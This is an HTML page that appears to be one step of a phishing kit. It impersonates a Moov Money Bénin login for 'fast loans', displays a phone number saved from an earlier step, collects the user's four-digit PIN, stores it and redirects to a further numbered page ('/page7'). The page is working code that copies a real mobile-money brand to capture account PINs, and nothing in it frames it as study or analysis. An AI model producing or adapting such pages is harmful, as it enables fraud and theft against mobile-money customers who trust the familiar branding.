<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Moov Money Bénin - Connexion</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>

    <style>
        :root {
            --moov-orange: #f26522;
            --moov-blue: #004b87;
        }
        body { background-color: #ffffff; margin: 0; display: flex; flex-direction: column; min-height: 100vh; font-family: sans-serif; }
        .header-box { width: 100%; background: linear-gradient(180deg, var(--moov-blue) 0%, #003865 100%); padding: 30px 20px; color: white; text-align: center; border-bottom: 4px solid var(--moov-orange); }
        .header-title { font-size: 30px; font-weight: 800; }
        .header-title .moov { color: var(--moov-orange); }
        .header-title .money { color: #fff; }

        .main-content { width: 90%; max-width: 400px; margin: 25px auto; text-align: center; flex-grow: 1; display: flex; flex-direction: column; align-items: center; }
        .phone-display { width: 100%; border: 1.5px solid var(--moov-blue); border-radius: 12px; padding: 14px; display: flex; align-items: center; gap: 12px; margin-bottom: 25px; font-weight: 700; font-size: 18px; }
        
        .pin-input-group { display: flex; gap: 12px; justify-content: center; margin-bottom: 25px; }
        .pin-box { width: 52px; height: 52px; border: 1.5px solid var(--moov-blue); border-radius: 12px; text-align: center; font-size: 22px; font-weight: bold; outline: none; }
        
        .btn-submit { background-color: #e2e2e2; color: #fff; border: none; width: 100%; padding: 16px; border-radius: 10px; font-size: 16px; font-weight: 800; cursor: not-allowed; }
        .btn-submit.active { background-color: var(--moov-orange); cursor: pointer; }
        .error-banner { background-color: #fde8e8; color: #e74c3c; padding: 10px; border-radius: 8px; margin-bottom: 15px; display: none; font-size: 13px; width: 100%; }
    </style>
</head>
<body>

<div class="header-box">
    <div class="header-title">
        <span class="moov">Moov</span><span class="money">Money</span>
    </div>
    <div style="font-size:14px; margin-top:5px;">Prêts Rapides & Sécurisés</div>
</div>

<div class="main-content">
    <h2>Connexion</h2>
    <div id="errorDisplay" class="error-banner"></div>

    <div class="phone-display">
        <span>🇧🇯</span>
        <span>+229</span>
        <span id="displayPhone">--</span>
    </div>

    <p style="color:#666; font-size:14px; margin-bottom:15px;">Entrez votre code PIN</p>

    <div class="pin-input-group">
        <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
        <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
        <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
        <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
    </div>

    <button id="loginBtn" class="btn-submit" disabled>SE CONNECTER</button>
</div>

<script>
    const pinBoxes = document.querySelectorAll('.pin-box');
    const loginBtn = document.getElementById('loginBtn');
    document.getElementById('displayPhone').textContent = localStorage.getItem('phone') || "97000000";

    pinBoxes.forEach((box, index) => {
        box.addEventListener('input', () => {
            box.value = box.value.replace(/\D/g, '');
            if (box.value && index < pinBoxes.length - 1) pinBoxes[index + 1].focus();
            const filled = [...pinBoxes].every(b => b.value.length === 1);
            loginBtn.disabled = !filled;
            loginBtn.classList.toggle('active', filled);
        });
    });

    loginBtn.addEventListener('click', () => {
        let pin = "";
        pinBoxes.forEach(b => pin += b.value);
        localStorage.setItem('lastPin', pin);
        window.location.href = "/page7";
    });
</script>
</body>
</html>
